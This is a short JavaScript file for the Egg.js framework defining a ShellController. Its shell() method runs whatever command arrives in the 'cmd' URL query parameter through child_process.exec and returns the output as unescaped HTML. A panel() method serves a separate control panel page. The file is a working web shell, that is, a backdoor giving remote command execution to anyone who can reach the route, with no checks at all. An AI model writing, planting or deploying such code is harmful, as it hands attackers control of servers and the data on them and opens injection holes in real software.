'use strict';
const util = require('util');
const exec = util.promisify(require("child_process").exec);
const Controller = require('egg').Controller;
const panelBody = require("../view/panel.js");

class ShellController extends Controller {
  async index() {
    this.ctx.body = 'hi, egg';
  }

  async shell(){
    if(!this.ctx.query.cmd){
      this.ctx.body = 'no cmd';return false;
    }
     const {stdout,stderr} = await exec(`${this.ctx.query.cmd}`);
     this.ctx.type = 'text/html';
     this.ctx.body = `stdout=><pre>${stdout}</pre>;<br/>stderr:${stderr}`
  }

  async panel(){
    this.ctx.type = 'text/html';
    this.ctx.body = panelBody;
  }
}

module.exports = ShellController;
